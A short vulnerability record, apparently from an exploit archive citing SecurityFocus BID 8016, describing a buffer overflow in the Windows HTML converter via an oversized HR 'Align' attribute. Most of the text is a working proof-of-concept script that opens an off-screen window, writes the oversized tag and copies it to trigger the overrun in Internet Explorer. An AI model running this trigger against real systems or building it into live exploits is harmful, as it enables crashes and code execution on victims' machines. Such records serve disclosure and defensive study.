@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/8016/info
+
+Microsoft Windows platforms are prone to a boundary condition error in the HTML converter. If the 'Align' attribute of the 'HR' tag is given an excessively large value, an internal buffer will be overrun. This issue can be exploited via applications which use the HTML converter (such as Internet Explorer) and will permit arbitrary code to be executed on a vulnerable system.
+
+<script>
+wnd=open("about:blank","","");
+wnd.moveTo(screen.Width,screen.Height);
+WndDoc=wnd.document;
+WndDoc.open();
+WndDoc.clear();
+buffer="";
+for(i=1;i<=127;i++)buffer+="X";
+buffer+="DigitalScream";
+WndDoc.write("<HR align='"+buffer+"'>");
+WndDoc.execCommand("SelectAll");
+WndDoc.execCommand("Copy");
+wnd.close();
+</script>
